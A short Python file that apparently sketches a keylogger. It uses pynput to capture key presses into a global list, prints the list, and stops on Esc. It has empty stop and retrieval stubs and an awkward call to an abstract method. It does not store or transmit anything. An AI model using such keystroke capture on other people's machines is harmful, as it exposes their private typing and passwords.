from pynput import keyboard
from abc import ABC, abstractmethod
import threading

text = []

class IKeyLogger(ABC):
    @abstractmethod
    def start_logging(self):
        def on_press(key):
            global text
            if key == keyboard.Key.enter:
                text.append(key)
            elif key == keyboard.Key.tab:
                text.append(key)
            elif key == keyboard.Key.space:
                text.append(' ') 
            elif key == keyboard.Key.shift:
                pass
            elif key == keyboard.Key.backspace and len(text) == 0:
                pass
            elif key == keyboard.Key.backspace and len(text) > 0:
                text = text[:-1]
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                pass
            elif key == keyboard.Key.esc:
                return False
            else:
                text.append(key)
                print(text)
        with keyboard.Listener(
            on_press=on_press) as listener: 
            listener.join()   
               
    @abstractmethod
    def stop_logging(self):
        # with keyboard.Listener(
        #     on_press=on_press) as listenner:
        #     listenner.stop()
        
        pass

    @abstractmethod
    def get_logged_keys(self):
        pass


a = IKeyLogger
a.start_logging(self=None)


